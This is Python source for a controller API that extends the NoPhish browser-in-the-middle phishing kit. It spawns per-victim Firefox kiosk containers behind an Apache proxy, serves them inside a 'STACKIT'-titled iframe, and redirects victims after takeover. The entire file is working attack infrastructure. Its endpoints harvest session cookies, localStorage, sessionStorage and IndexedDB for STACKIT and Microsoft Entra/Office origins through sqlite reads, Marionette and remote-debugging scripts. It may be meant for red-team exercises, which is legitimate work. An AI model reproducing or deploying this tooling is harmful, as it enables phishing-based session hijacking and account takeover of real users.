#!/usr/bin/env python3
"""NoPhish controller API.

A thin control plane on top of the existing NoPhish docker setup, so an
orchestrator (e.g. ConsentFix) can spawn, inspect, harvest and tear down
victim sessions on demand instead of everything being fixed at setup.sh
launch time.

It reuses NoPhish's images (vnc-docker / rev-proxy) and its apache reverse
proxy, but adds/removes per-session config files at runtime and reloads
apache gracefully. Only desktop containers are supported for now.

Auth: every /api/* request must send `X-API-Key`.

Env:
    CONTROLLER_API_KEY   shared secret (generated + logged if unset)
    CONTROLLER_HOST      default 0.0.0.0
    CONTROLLER_PORT      default 6600
    NOPHISH_DOMAIN       public hostname used to build victim URLs
    NOPHISH_SSL          "true" to use https in victim URLs
    NOPHISH_CERT/KEY     cert/key paths (copied into proxy when SSL enabled)
    VNC_IMAGE            default "vnc-docker"
    PROXY_IMAGE          default "rev-proxy"
    SESSIONS_DIR         default "<repo>/controller/state"
    DOCKER_CMD           default "sudo docker"
    DEFAULT_UA           Firefox UA override (must look like a real browser)
"""

import json
import os
import secrets
import shlex
import shutil
import socket
import sqlite3
import subprocess
import tempfile
import threading
import time
from datetime import datetime, timezone
from functools import wraps

from flask import Flask, jsonify, request

REPO_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

API_KEY = os.environ.get("CONTROLLER_API_KEY") or secrets.token_hex(16)
HOST = os.environ.get("CONTROLLER_HOST", "0.0.0.0")
PORT = int(os.environ.get("CONTROLLER_PORT", "6600"))
DOMAIN = os.environ.get("NOPHISH_DOMAIN", "localhost")
USE_SSL = os.environ.get("NOPHISH_SSL", "false").lower() in ("1", "true", "yes")
CERT = os.environ.get("NOPHISH_CERT", "")
KEY = os.environ.get("NOPHISH_KEY", "")
VNC_IMAGE = os.environ.get("VNC_IMAGE", "vnc-docker")
PROXY_IMAGE = os.environ.get("PROXY_IMAGE", "rev-proxy")
# The accetto VNC base is amd64-only; set e.g. VNC_PLATFORM=linux/amd64 on an arm host.
VNC_PLATFORM = os.environ.get("VNC_PLATFORM", "")
# Extra `docker run` args for the VNC container, e.g. VNC_RUN_ARGS="--user root".
VNC_RUN_ARGS = shlex.split(os.environ.get("VNC_RUN_ARGS", ""))
SESSIONS_DIR = os.environ.get("SESSIONS_DIR", os.path.join(REPO_DIR, "controller", "state"))
DOCKER_CMD = os.environ.get("DOCKER_CMD", "sudo docker").split()
PROXY_NAME = "rev-proxy"
BASE_CONF = "/etc/apache2/conf-enabled/zz-stackit-base.conf"
DEFAULT_UA = os.environ.get(
    "DEFAULT_UA",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
)
SCHEME = "https" if USE_SSL else "http"

app = Flask(__name__)
_lock = threading.RLock()
STATE_FILE = os.path.join(SESSIONS_DIR, "state.json")


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def log(msg):
    print(f"[{datetime.now(timezone.utc).isoformat()}] {msg}", flush=True)


def run(cmd, check=True, capture=True):
    log("$ " + " ".join(cmd))
    res = subprocess.run(
        cmd, check=False, text=True,
        stdout=subprocess.PIPE if capture else None,
        stderr=subprocess.STDOUT if capture else None,
    )
    if res.stdout:
        log(res.stdout.rstrip())
    if check and res.returncode != 0:
        raise RuntimeError(f"command failed ({res.returncode}): {' '.join(cmd)}")
    return res


def docker(*args, check=True):
    return run(DOCKER_CMD + list(args), check=check)


def proxy_exec(script, check=True):
    return docker("exec", PROXY_NAME, "/bin/bash", "-c", script, check=check)


def _load_state():
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE) as f:
            return json.load(f)
    return {"sessions": {}}


def _save_state(state):
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    tmp = STATE_FILE + ".tmp"
    with open(tmp, "w") as f:
        json.dump(state, f, indent=2)
    os.replace(tmp, STATE_FILE)


def _container_running(name):
    res = docker("inspect", "-f", "{{.State.Running}}", name, check=False)
    return res.returncode == 0 and (res.stdout or "").strip() == "true"


def _container_ip(name):
    res = docker("inspect", "-f",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", name)
    return (res.stdout or "").strip()


def require_api_key(fn):
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if request.headers.get("X-API-Key") != API_KEY:
            return jsonify({"error": "forbidden"}), 403
        return fn(*args, **kwargs)
    return wrapper


# ---------------------------------------------------------------------------
# infrastructure
# ---------------------------------------------------------------------------

def _platform_args(image):
    return ["--platform", VNC_PLATFORM] if VNC_PLATFORM and image == VNC_IMAGE else []


def ensure_images():
    for image, dockerfile in ((VNC_IMAGE, "VNC-Dockerfile"), (PROXY_IMAGE, "PROXY-Dockerfile")):
        res = docker("image", "inspect", image, check=False)
        if res.returncode != 0:
            log(f"building image {image} ...")
            docker("build", *_platform_args(image), "-t", image,
                   "-f", os.path.join(REPO_DIR, dockerfile), REPO_DIR)


def ensure_proxy():
    res = docker("inspect", "-f", "{{.State.Running}}", PROXY_NAME, check=False)
    if res.returncode != 0:
        ports = ["-p", "443:443", "-p", "65534:65534"] if USE_SSL else ["-p", "80:80", "-p", "65534:65534"]
        docker("run", "-dit", *ports, "--name", PROXY_NAME, PROXY_IMAGE, "/bin/bash")
        time.sleep(3)
        proxy_exec("a2enmod rewrite proxy proxy_http proxy_wstunnel headers ssl >/dev/null 2>&1; a2dissite 000-default >/dev/null 2>&1; true")
        if USE_SSL and CERT and KEY:
            docker("cp", CERT, f"{PROXY_NAME}:/etc/ssl/certs/server.pem")
            docker("cp", KEY, f"{PROXY_NAME}:/etc/ssl/private/server.key")
        base = _render_base_conf()
        _write_proxy_file(BASE_CONF, base)
        proxy_exec("apache2ctl -k graceful >/dev/null 2>&1 || service apache2 restart >/dev/null 2>&1; true")
    else:
        _write_proxy_file(BASE_CONF, _render_base_conf())
        _reload_proxy()


def _render_base_conf():
    lines = ["ServerName " + DOMAIN, "DocumentRoot /var/www/html",
             "Header unset ETag",
             'Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"',
             'Header set Pragma "no-cache"',
             "RewriteEngine On",
             "RewriteMap redirects txt:/tmp/redirects.txt",
             "RewriteCond ${redirects:%{REQUEST_URI}} ^(.+)$",
             "RewriteRule ^(.*)$ ${redirects:$1} [R,L]"]
    if USE_SSL:
        lines += ["Listen 443", "SSLEngine on",
                  "SSLCertificateFile /etc/ssl/certs/server.pem",
                  "SSLCertificateKeyFile /etc/ssl/private/server.key"]
    return "\n".join(lines) + "\n"


def _write_proxy_file(dest, content):
    fd, tmp = tempfile.mkstemp()
    with os.fdopen(fd, "w") as f:
        f.write(content)
    # docker cp preserves mode/owner; make it world-readable for www-data
    os.chmod(tmp, 0o644)
    docker("cp", tmp, f"{PROXY_NAME}:{dest}")
    proxy_exec(f"chmod 644 {dest}")
    os.unlink(tmp)


def _reload_proxy():
    proxy_exec("apache2ctl -k graceful >/dev/null 2>&1 || service apache2 restart >/dev/null 2>&1; true")


# ---------------------------------------------------------------------------
# session rendering
# ---------------------------------------------------------------------------

def _render_iframe(slug, pw):
    return f"""<!DOCTYPE html>
<html lang='en'>
<head>
<meta charset='UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1.0'>
<title>STACKIT</title>
<style>
body,html{{height:100%;margin:0;overflow:hidden}}
iframe{{width:100%;height:100%;border:none}}
</style>
</head>
<body>
<iframe src='{SCHEME}://{DOMAIN}/{pw}/conn.html?path=/{pw}/websockify&password={pw}&autoconnect=true&resize=remote' frameborder='0'></iframe>
</body>
</html>
"""


def _render_session_conf(slug, pw, cip):
    return f"""# NoPhish controller session {slug}
RewriteRule ^/s/{slug}/?$ /iframe-{slug}.html [L]
<Location /{pw}>
    ProxyPass http://{cip}:6901
    ProxyPassReverse http://{cip}:6901
</Location>
<Location /{pw}/websockify>
    ProxyPass ws://{cip}:6901/websockify keepalive=On
    ProxyPassReverse ws://{cip}:6901/websockify
</Location>
ProxyTimeout 600
Timeout 600
"""


def _install_session_routing(session):
    slug, pw = session["slug"], session["pw"]
    _write_proxy_file(f"/var/www/html/iframe-{slug}.html", _render_iframe(slug, pw))
    _write_proxy_file(f"/etc/apache2/conf-enabled/stackit-{slug}.conf",
                      _render_session_conf(slug, pw, session["ip"]))
    _reload_proxy()


def _remove_session_routing(slug):
    proxy_exec(
        f"rm -f /var/www/html/iframe-{slug}.html "
        f"/etc/apache2/conf-enabled/stackit-{slug}.conf"
    )
    _reload_proxy()


# ---------------------------------------------------------------------------
# container lifecycle
# ---------------------------------------------------------------------------

def _write_user_js(name):
    user_js = (
        f'user_pref("general.useragent.override","{DEFAULT_UA}");\n'
        # skip first-run onboarding / ToU / what's-new / default-browser prompts
        # (set both prefixed and unprefixed variants across Firefox versions)
        'user_pref("aboutwelcome.enabled", false);\n'
        'user_pref("browser.aboutwelcome.enabled", false);\n'
        'user_pref("aboutwelcome.didSeeFinalScreen", true);\n'
        'user_pref("browser.aboutwelcome.didSeeFinalScreen", true);\n'
        'user_pref("termsofuse.bypassNotification", true);\n'
        'user_pref("browser.termsofuse.bypassNotification", true);\n'
        'user_pref("termsofuse.acceptedVersion", 999999);\n'
        'user_pref("browser.termsofuse.acceptedVersion", 999999);\n'
        'user_pref("browser.startup.homepage_override.mstone", "ignore");\n'
        'user_pref("browser.shell.checkDefaultBrowser", false);\n'
        'user_pref("browser.startup.page", 1);\n'
        'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n'
        'user_pref("toolkit.telemetry.reportingpolicy.firstRun", false);\n'
        'user_pref("trailhead.firstrun.didSeeAboutWelcome", true);\n'
        'user_pref("browser.sessionstore.interval", 2000);\n'
        'user_pref("dom.storage.shadow_writes", true);\n'
        'user_pref("marionette.enabled", true);\n'
        'user_pref("marionette.port", 2828);\n'
        'user_pref("signon.rememberSignons", false);\n'
        'user_pref("signon.formlessCapture.enabled", false);\n'
        'user_pref("signon.storeWhenAutocompleteOff", false);\n'
    )
    fd, tmp = tempfile.mkstemp()
    with os.fdopen(fd, "w") as f:
        f.write(user_js)
    docker("cp", tmp, f"{name}:/tmp/user.js")
    os.unlink(tmp)
    # copy into every Firefox profile (matched via prefs.js / cookies.sqlite)
    docker("exec", name, "sh", "-c",
           "find / -name prefs.js -execdir cp -f /tmp/user.js . \\; 2>/dev/null; "
           "find / -name cookies.sqlite -execdir cp -f /tmp/user.js . \\; 2>/dev/null; "
           "for b in /home/*/.config/mozilla/firefox /home/*/.mozilla/firefox "
           "/root/.config/mozilla/firefox /root/.mozilla/firefox; do "
           "[ -d \"$b\" ] && for d in \"$b\"/*/; do cp -f /tmp/user.js \"$d\" 2>/dev/null; done; done; true")


def _reload_firefox(name, target):
    # Prefer a fast soft reload (xdotool) so the page refreshes without a blank restart.
    res = docker("exec", name, "sh", "-c",
                 "command -v xdotool >/dev/null 2>&1 && DISPLAY=:1 xdotool key --clearmodifiers ctrl+r",
                 check=False)
    if res.returncode == 0:
        return
    docker("exec", name, "sh", "-c",
           f"pkill firefox; sleep 1; nohup env DISPLAY=:1 firefox {target} --kiosk > /dev/null 2>&1 &")


def _start_container(name, pw, target_url):
    docker("run", "-dit", *_platform_args(VNC_IMAGE), *VNC_RUN_ARGS, "--name", name,
           "-e", f"VNC_PW={pw}", "-e", "NOVNC_HEARTBEAT=30", VNC_IMAGE)
    time.sleep(4)
    # create the Firefox profile once, dismiss the first-run welcome, so the
    # landing shows immediately when the victim connects
    docker("exec", name, "sh", "-c",
           "env DISPLAY=:1 firefox --remote-debugging-port=9222 about:blank > /dev/null 2>&1 & sleep 8; pkill firefox; sleep 2")
    _write_user_js(name)
    # TARGET_URL is used by ui.js when the victim disconnects / takes over.
    docker("exec", "--user", "root", name, "sh", "-c",
           f"sed -i 's#TARGET_URL#{target_url}#g' /usr/libexec/noVNCdim/app/ui.js")
    docker("exec", name, "sh", "-c",
           f"nohup env DISPLAY=:1 firefox --remote-debugging-port=9222 {target_url} --kiosk > /dev/null 2>&1 &")
    # dismiss the Firefox first-run welcome once it appears (harmless if absent)
    dismiss = (
        "for i in 1 2 3 4 5 6; do "
        "W=$(DISPLAY=:1 xdotool search --onlyvisible --class firefox 2>/dev/null | head -1); "
        "if [ -n \"$W\" ]; then "
        "DISPLAY=:1 xdotool windowactivate --sync $W 2>/dev/null; "
        "DISPLAY=:1 xdotool mousemove --sync 680 325 2>/dev/null; "
        "DISPLAY=:1 xdotool mousedown 1 2>/dev/null; DISPLAY=:1 xdotool mouseup 1 2>/dev/null; "
        "fi; sleep 5; done"
    )
    docker("exec", "-d", name, "sh", "-c", dismiss)
    return _container_ip(name)


def _read_cookies(name):
    """Copy the newest cookie store (db + wal + shm) out and parse it.

    Firefox keeps recent writes in cookies.sqlite-wal until checkpoint, so the
    sidecar files must be copied too or the DB reads as empty.
    """
    # use the known profile dirs (a full `find /` is far too slow under qemu)
    docker("exec", name, "sh", "-c",
           "rm -rf /tmp/ck; mkdir -p /tmp/ck; "
           "p=$({ for b in /home/*/.config/mozilla/firefox /home/*/.mozilla/firefox "
           "/root/.config/mozilla/firefox /root/.mozilla/firefox; do "
           "for f in \"$b\"/*/cookies.sqlite; do [ -f \"$f\" ] && stat -c '%Y %n' \"$f\"; done; done; } "
           "| sort -nr | head -1 | cut -d' ' -f2-); "
           "[ -n \"$p\" ] && cp \"$p\"* /tmp/ck/ 2>/dev/null; true", check=False)
    hostdir = tempfile.mkdtemp()
    try:
        res = docker("cp", f"{name}:/tmp/ck/.", hostdir, check=False)
        db = os.path.join(hostdir, "cookies.sqlite")
        if res.returncode != 0 or not os.path.exists(db):
            return []
        cookies = []
        con = sqlite3.connect(db)
        try:
            con.text_factory = lambda b: b.decode(errors="ignore")
            cur = con.cursor()
            cur.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite FROM moz_cookies")
            for host, cname, value, path, expiry, secure, httponly, samesite in cur.fetchall():
                cookies.append({
                    "host": host, "name": cname, "value": value, "path": path,
                    "expiry": expiry, "secure": bool(secure), "httpOnly": bool(httponly),
                    "sameSite": samesite,
                })
        finally:
            con.close()
        return cookies
    finally:
        shutil.rmtree(hostdir, ignore_errors=True)


def _origin_host(name):
    # storage origin dirs look like https+++portal.stackit.cloud
    try:
        return name.replace("+++", "://", 1).split("://", 1)[1].replace("+", ":")
    except Exception:
        return name


def _b2s(b):
    if isinstance(b, str):
        return b
    if isinstance(b, (bytes, bytearray)):
        for enc in ("utf-8", "utf-16-le", "utf-16-be"):
            try:
                return bytes(b).decode(enc)
            except Exception:
                continue
        return bytes(b).decode("utf-8", "ignore")
    return b


def _collect_session_storage(node, out):
    """Walk a sessionstore JSON blob collecting sessionStorage per origin.

    The session store keeps per-entry `storage` maps of origin -> {sessionStorage: {...}}.
    """
    if isinstance(node, dict):
        for k, v in node.items():
            if k == "storage" and isinstance(v, dict):
                for origin, sm in v.items():
                    if isinstance(sm, dict) and isinstance(sm.get("sessionStorage"), dict):
                        out.setdefault(str(origin), {}).update(
                            {str(a): _b2s(b) for a, b in sm["sessionStorage"].items()})
            _collect_session_storage(v, out)
    elif isinstance(node, list):
        for v in node:
            _collect_session_storage(v, out)


_MARIONETTE_PROG = r"""
import os, json, socket, base64
script = base64.b64decode(os.environ["M_SCRIPT"]).decode()
args = json.loads(os.environ.get("M_ARGS", "[]"))
ctx = os.environ.get("M_CTX", "chrome")
s = socket.create_connection(("127.0.0.1", 2828), timeout=2)
s.settimeout(2)
def recv():
    buf = b""
    while b":" not in buf:
        buf += s.recv(1)
    n = int(buf[:-1]); d = b""
    while len(d) < n:
        d += s.recv(n - len(d))
    return json.loads(d)
def send(m):
    b = json.dumps(m).encode(); s.sendall(str(len(b)).encode() + b":"); s.sendall(b)
try:
    recv()
    send({"id": 0, "name": "WebDriver:NewSession", "parameters": {"capabilities": {}}})
    sid = None
    while True:
        m = recv()
        if m.get("id") == 0:
            sid = m.get("result", {}).get("sessionId"); break
    send({"id": 1, "name": "Marionette:SetContext", "parameters": {"value": ctx}})
    send({"id": 2, "name": "WebDriver:ExecuteScript",
          "parameters": {"script": script, "args": args, "sessionId": sid}})
    res = None
    while True:
        m = recv()
        if m.get("id") == 2:
            res = m; break
    send({"id": 3, "name": "WebDriver:DeleteSession", "parameters": {}})
    print(json.dumps(res))
finally:
    s.close()
"""


def _marionette(name, script, args=None, context="chrome"):
    """Run a script via Marionette by executing the client inside the container."""
    import base64 as _b64
    env = ["-e", "M_SCRIPT=" + _b64.b64encode(script.encode()).decode(),
           "-e", "M_ARGS=" + json.dumps(args or []),
           "-e", "M_CTX=" + context]
    res = docker("exec", *env, name, "python3", "-c", _MARIONETTE_PROG, check=False)
    if res.returncode != 0:
        raise RuntimeError("marionette exec failed")
    out = (res.stdout or "").strip().splitlines()
    if not out:
        raise RuntimeError("no marionette output")
    m = json.loads(out[-1])
    if m.get("error"):
        raise RuntimeError(str(m.get("error")))
    return m.get("result", {}).get("value")


_READ_TABS = """
var out = [];
for (const t of gBrowser.tabs) {
  try {
    var w = t.linkedBrowser.contentWindow;
    var o = {url: w.location.href, localStorage: {}, sessionStorage: {}};
    try { o.localStorage = Object.assign({}, w.localStorage); } catch (e) {}
    try { o.sessionStorage = Object.assign({}, w.sessionStorage); } catch (e) {}
    out.push(o);
  } catch (e) {}
}
return out;
"""

_OPEN_TABS = """
var ids = [];
for (const u of arguments[0]) {
  try { ids.push(gBrowser.addTab(u, {inBackground: true})); } catch (e) {}
}
window.__phish_ids = ids;
return ids.length;
"""

_CLOSE_TABS = """
try { for (const t of (window.__phish_ids || [])) { try { gBrowser.removeTab(t); } catch (e) {} } } catch (e) {}
window.__phish_ids = null;
return true;
"""


def _origin_host_to_url(host):
    return "https://" + host + "/"


def _live_storage(name, ip, origins):
    """Read live localStorage/sessionStorage. `origins` = hosts known from disk."""
    open_hosts = set()
    try:
        tabs = _marionette(name, _READ_TABS) or []
    except Exception:
        return None
    result = {}
    for t in tabs:
        url = t.get("url", "")
        host = url.split("://", 1)[-1].split("/", 1)[0]
        open_hosts.add(host)
        if t.get("localStorage") or t.get("sessionStorage"):
            result.setdefault(url, {})
            if t.get("localStorage"):
                result[url]["localStorage"] = t["localStorage"]
            if t.get("sessionStorage"):
                result[url]["sessionStorage"] = t["sessionStorage"]
    missing = [h for h in origins if h and h not in open_hosts]
    if missing:
        try:
            _marionette(name, _OPEN_TABS, args=[[_origin_host_to_url(h) for h in missing]])
            time.sleep(2)
            for t in (_marionette(name, _READ_TABS) or []):
                host = t.get("url", "").split("://", 1)[-1].split("/", 1)[0]
                if host in missing and (t.get("localStorage") or t.get("sessionStorage")):
                    result.setdefault(t["url"], {})
                    if t.get("localStorage"):
                        result[t["url"]]["localStorage"] = t["localStorage"]
                    if t.get("sessionStorage"):
                        result[t["url"]]["sessionStorage"] = t["sessionStorage"]
            _marionette(name, _CLOSE_TABS)
        except Exception:
            pass
    return result


_CDP_PROG = r"""
import json
import websocket

out = {}
try:
    ws = websocket.create_connection("ws://127.0.0.1:9222/session",
                                     timeout=8, suppress_origin=True)
except Exception:
    print("{}"); raise SystemExit

_id = 0
def cmd(method, params):
    global _id
    _id += 1
    ws.send(json.dumps({"id": _id, "method": method, "params": params}))
    while True:
        m = json.loads(ws.recv())
        if m.get("id") == _id:
            return m

sid = None
try:
    r = cmd("session.new", {"capabilities": {}})
    sid = (r.get("result") or {}).get("sessionId")
    tree = cmd("browsingContext.getTree", {})
    for c in (tree.get("result") or {}).get("contexts", []):
        url, ctx = c.get("url", ""), c.get("context")
        if not ctx:
            continue
        try:
            r = cmd("script.evaluate", {
                "expression": "(function(){function d(s){var o={};for(var i=0;i<s.length;i++){var k=s.key(i);o[k]=s.getItem(k);}return o;}return JSON.stringify({ls:d(localStorage),ss:d(sessionStorage)});})()",
                "target": {"context": ctx}, "awaitPromise": False})
            v = ((r.get("result") or {}).get("result") or {}).get("value")
            if v:
                out[url] = json.loads(v)
        except Exception:
            pass
finally:
    try:
        if sid:
            cmd("session.end", {"sessionId": sid})
    except Exception:
        pass
    try:
        ws.close()
    except Exception:
        pass
print(json.dumps(out))
"""


def _cdp(name):
    """Read live localStorage/sessionStorage from open tabs via CDP."""
    import base64 as _b64
    res = docker("exec", "-e", "M_PROG=" + _b64.b64encode(_CDP_PROG.encode()).decode(),
                 name, "python3", "-c", _CDP_PROG, check=False)
    out = (res.stdout or "").strip().splitlines()
    if not out:
        return None
    try:
        return json.loads(out[-1])
    except Exception:
        return None


def _read_storage(name):
    """Best-effort copy+parse of localStorage / sessionStorage for relevant origins."""
    docker("exec", name, "sh", "-c",
           "rm -rf /tmp/st; mkdir -p /tmp/st/storage; "
           "P=$(for b in /home/*/.config/mozilla/firefox /root/.config/mozilla/firefox; do "
           "ls -dt \"$b\"/*.default-release \"$b\"/* 2>/dev/null; done | head -1); "
           "[ -z \"$P\" ] && exit 0; "
           "for d in \"$P\"/storage/default/*; do b=$(basename \"$d\" 2>/dev/null); "
           "case \"$b\" in *stackit*|*microsoft*|*office*|*live.com*) cp -r \"$d\" /tmp/st/storage/ 2>/dev/null;; esac; done; "
           "cp \"$P\"/webappsstore.sqlite /tmp/st/ 2>/dev/null; "
           "cp \"$P\"/sessionstore-backups/recovery.jsonlz4 /tmp/st/ 2>/dev/null; true", check=False)
    hostdir = tempfile.mkdtemp()
    result = {}
    try:
        if docker("cp", f"{name}:/tmp/st/.", hostdir, check=False).returncode != 0:
            return {}
        # modern localStorage + IndexedDB per origin
        sdir = os.path.join(hostdir, "storage")
        if os.path.isdir(sdir):
            for origin_dir in os.listdir(sdir):
                origin = _origin_host(origin_dir)
                lsdir = os.path.join(sdir, origin_dir, "ls")
                if os.path.isdir(lsdir):
                    for fn in os.listdir(lsdir):
                        if not fn.endswith(".sqlite"):
                            continue
                        try:
                            con = sqlite3.connect(os.path.join(lsdir, fn))
                            con.text_factory = lambda b: b.decode(errors="ignore")
                            rows = con.execute("SELECT key, value FROM data").fetchall()
                            con.close()
                            if rows:
                                result.setdefault(origin, {}).setdefault("localStorage", {}).update(
                                    {str(k): _b2s(v) for k, v in rows})
                        except Exception:
                            pass
                idb = os.path.join(sdir, origin_dir, "idb")
                if os.path.isdir(idb):
                    dump = []
                    for fn in os.listdir(idb):
                        if not fn.endswith(".sqlite"):
                            continue
                        try:
                            con2 = sqlite3.connect(os.path.join(idb, fn))
                            con2.text_factory = lambda b: b.decode(errors="ignore")
                            tabs = [r[0] for r in con2.execute(
                                "SELECT name FROM sqlite_master WHERE type='table'")]
                            tables = {}
                            for t in tabs:
                                try:
                                    tables[t] = [[_b2s(c) for c in row] for row in
                                                 con2.execute(f'SELECT * FROM "{t}" LIMIT 200')]
                                except Exception:
                                    pass
                            con2.close()
                            dump.append({"file": fn, "tables": tables})
                        except Exception:
                            continue
                    if dump:
                        result.setdefault(origin, {})["indexedDB"] = dump
        # legacy localStorage
        legacy = os.path.join(hostdir, "webappsstore.sqlite")
        if os.path.exists(legacy):
            try:
                con = sqlite3.connect(legacy)
                con.text_factory = lambda b: b.decode(errors="ignore")
                for tbl in ("webappsstore2", "moz_webappsstore"):
                    try:
                        rows = con.execute(f"SELECT scope, key, value FROM {tbl}").fetchall()
                    except Exception:
                        continue
                    for scope, k, v in rows:
                        result.setdefault(str(scope), {})["localStorage"] = {str(k): _b2s(v)}
            except Exception:
                pass
        # sessionStorage from the recovery store
        rec = os.path.join(hostdir, "recovery.jsonlz4")
        if os.path.exists(rec):
            try:
                import json as _json
                import lz4.block
                raw = open(rec, "rb").read()[8:]
                data = _json.loads(lz4.block.decompress(raw))
                found = {}
                _collect_session_storage(data, found)
                for origin, kv in found.items():
                    if any(x in origin for x in ("stackit", "microsoft", "office", "live.com")):
                        result.setdefault(_origin_host(origin), {})["sessionStorage"] = kv
            except Exception:
                pass
        # live values via CDP (overrides possibly-stale disk copies)
        try:
            live = _cdp(name)
            if live:
                for url, kv in live.items():
                    host = url.split("://", 1)[-1].split("/", 1)[0]
                    slot = result.setdefault(host, {})
                    if kv.get("ls"):
                        slot.setdefault("localStorage", {}).update(kv["ls"])
                    if kv.get("ss"):
                        slot.setdefault("sessionStorage", {}).update(kv["ss"])
        except Exception:
            pass
        return result
    finally:
        shutil.rmtree(hostdir, ignore_errors=True)


def _group_cookies(cookies):
    groups = {"entra": [], "stackit": [], "other": []}
    for c in cookies:
        h = c["host"].lower()
        if "stackit.cloud" in h:
            groups["stackit"].append(c)
        elif "microsoftonline.com" in h or "microsoft.com" in h or "live.com" in h or "windows.net" in h:
            groups["entra"].append(c)
        else:
            groups["other"].append(c)
    return groups


# ---------------------------------------------------------------------------
# API
# ---------------------------------------------------------------------------

@app.route("/healthz")
def healthz():
    return jsonify({"status": "ok", "domain": DOMAIN})


@app.route("/api/sessions", methods=["POST"])
@require_api_key
def create_session():
    data = request.get_json(silent=True) or {}
    lure_id = (data.get("lure_id") or "").strip()
    target = (data.get("target") or "").strip()
    if not lure_id:
        return jsonify({"error": "lure_id required"}), 400
    if not target:
        return jsonify({"error": "target required"}), 400

    with _lock:
        state = _load_state()
        ensure_images()
        ensure_proxy()

        # idempotent per lure
        for s in state["sessions"].values():
            if s["lure_id"] == lure_id and s["status"] != "released":
                if _container_running(s["name"]):
                    return jsonify(_public_session(s)), 200
                # container died (e.g. controller restart): recreate with same slug/pw
                log(f"reviving dead container for session {s['session_id']}")
                docker("rm", "-f", s["name"], check=False)
                try:
                    s["ip"] = _start_container(s["name"], s["pw"], target)
                    s["status"] = "active"
                    _save_state(state)
                    _install_session_routing(s)
                except Exception as e:
                    return jsonify({"error": f"failed to restart container: {e}"}), 500
                return jsonify(_public_session(s)), 201

        session_id = secrets.token_hex(8)
        slug = secrets.token_hex(6)
        pw = secrets.token_hex(16)
        name = f"vnc-{slug}"
        try:
            ip = _start_container(name, pw, target)
        except Exception as e:
            docker("rm", "-f", name, check=False)
            return jsonify({"error": f"failed to start container: {e}"}), 500

        session = {
            "session_id": session_id, "slug": slug, "pw": pw, "name": name,
            "lure_id": lure_id, "target": target, "ip": ip,
            "created": datetime.now(timezone.utc).isoformat(), "status": "active",
        }
        state["sessions"][session_id] = session
        _save_state(state)
        _install_session_routing(session)
        log(f"session {session_id} created for lure {lure_id}")
        return jsonify(_public_session(session)), 201


@app.route("/api/sessions", methods=["GET"])
@require_api_key
def list_sessions():
    state = _load_state()
    out = []
    for s in state["sessions"].values():
        item = _public_session(s)
        if s["status"] == "active":
            try:
                groups = _group_cookies(_read_cookies(s["name"]))
                item["counts"] = {k: len(v) for k, v in groups.items()}
            except Exception:
                item["counts"] = {}
        out.append(item)
    return jsonify({"sessions": out})


@app.route("/api/sessions/<session_id>", methods=["GET"])
@require_api_key
def get_session(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    return jsonify(_public_session(s))


@app.route("/api/sessions/<session_id>/cookies", methods=["GET"])
@require_api_key
def get_cookies(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    cookies = _read_cookies(s["name"])
    groups = _group_cookies(cookies)
    return jsonify({
        "session_id": session_id,
        "lure_id": s["lure_id"],
        "cookies": cookies,
        "groups": groups,
        "counts": {k: len(v) for k, v in groups.items()},
    })


@app.route("/api/sessions/<session_id>/storage", methods=["GET"])
@require_api_key
def get_storage(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    data = _read_storage(s["name"])
    groups = {"entra": {}, "stackit": {}, "other": {}}
    for origin, kv in data.items():
        h = origin.lower()
        if "stackit" in h:
            groups["stackit"][origin] = kv
        elif "microsoft" in h or "office" in h or "live.com" in h:
            groups["entra"][origin] = kv
        else:
            groups["other"][origin] = kv
    return jsonify({"session_id": session_id, "storage": data, "groups": groups,
                    "counts": {k: len(v) for k, v in groups.items()}})


@app.route("/api/sessions/<session_id>/reload", methods=["POST"])
@require_api_key
def reload_session(session_id):
    """Reload the container's page at the target (picks up landing changes)."""
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    if not _container_running(s["name"]):
        return jsonify({"error": "container not running"}), 409
    _reload_firefox(s["name"], s["target"])
    return jsonify({"status": "reloaded", "session_id": session_id})


@app.route("/api/sessions/<session_id>/disconnect", methods=["POST"])
@require_api_key
def disconnect_session(session_id):
    s = _load_state()["sessions"].get(session_id)
    if not s:
        return jsonify({"error": "not found"}), 404
    ip, pw, target = s["ip"], s["pw"], s["target"]
    proxy_exec(
        "sh -c 'grep -qxF {ip} /tmp/disconnect.txt 2>/dev/null || echo {ip} >> /tmp/disconnect.txt'; "
        "sh -c 'grep -qF /{pw}/ /tmp/redirects.txt 2>/dev/null || "
        "(echo \"/{pw}/websockify {target}\" >> /tmp/redirects.txt; "
        "echo \"/{pw}/conn.html {target}\" >> /tmp/redirects.txt)'".format(ip=ip, pw=pw, target=target)
    )
    return jsonify({"status": "disconnected", "session_id": session_id})


@app.route("/api/sessions/<session_id>/release", methods=["POST"])
@require_api_key
def release_session(session_id):
    with _lock:
        state = _load_state()
        s = state["sessions"].get(session_id)
        if not s:
            return jsonify({"error": "not found"}), 404
        docker("rm", "-f", s["name"], check=False)
        _remove_session_routing(s["slug"])
        s["status"] = "released"
        s["released"] = datetime.now(timezone.utc).isoformat()
        _save_state(state)
        log(f"session {session_id} released")
        return jsonify({"status": "released", "session_id": session_id})


def _public_session(s):
    return {
        "session_id": s["session_id"],
        "lure_id": s["lure_id"],
        "status": s["status"],
        "url": f"{SCHEME}://{DOMAIN}/s/{s['slug']}",
        "target": s["target"],
        "created": s["created"],
        "released": s.get("released"),
    }


if __name__ == "__main__":
    log(f"controller starting; api_key={API_KEY}")
    log(f"public scheme={SCHEME} domain={DOMAIN}; images={VNC_IMAGE}/{PROXY_IMAGE}")
